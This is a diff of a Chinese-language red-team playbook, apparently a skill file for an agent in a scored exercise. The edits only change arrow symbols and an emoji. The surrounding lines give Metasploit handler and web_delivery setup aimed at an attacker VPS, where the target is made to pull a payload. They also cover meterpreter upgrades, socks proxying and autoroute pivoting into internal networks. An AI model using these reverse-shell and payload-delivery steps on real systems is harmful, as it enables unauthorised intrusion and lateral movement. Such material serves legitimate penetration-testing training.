@@ -39,7 +39,7 @@ enabled: true
 | **要长期操作 / 传文件 / 开隧道**（**主力**） | **MSF `multi/handler`**（自动重连、可升级 meterpreter、能开 socks） |
 | **目标只能出 HTTP(S)** | `web_delivery`（MSF 生成一行命令，目标主动拉 payload） |
 | **Windows 目标、要稳** | MSF handler + `shell_to_meterpreter` 升级 |
-| **需要把内网流量代理回来** | 拿到 shell 后**不是**用 shell 代理，而是落地 WebShell → `suo5-tunnel`（见技能） |
+| **需要把内网流量代理回来** | 拿到 shell 后**不是**用 shell 代理，而是落地 WebShell -> `suo5-tunnel`（见技能） |
 
 ## 二、MSF handler（推荐主力）
 
@@ -102,7 +102,7 @@ msf6 > set LHOST $REDTEAM_VPS_HOST
 msf6 > set LPORT 9002
 msf6 > exploit -j
 # MSF 会输出一行命令（形如 python -c "import urllib.request;..."），
-# 把它投到目标的命令执行点 → 目标主动拉 payload → 会话建立
+# 把它投到目标的命令执行点 -> 目标主动拉 payload -> 会话建立
 ```
 
 ## 五、升级与维持
@@ -121,7 +121,7 @@ msf6 > set VERSION 5
 msf6 > exploit -j
 # 之后 proxychains 指向 127.0.0.1:1080 即可进内网
 ```
-> ⚠️ 记分口径：**只有自己 VPS 上的代理不算隧道**。通过 meterpreter autoroute 打到的内网目标属于
+> 注意：记分口径：**只有自己 VPS 上的代理不算隧道**。通过 meterpreter autoroute 打到的内网目标属于
 > `entry_kind=target-agent`（经目标已控进程转发），登记 `redteam_tunnel_add` 时必须说清目标侧那一端。
 
 ## 六、纪律（必须遵守）
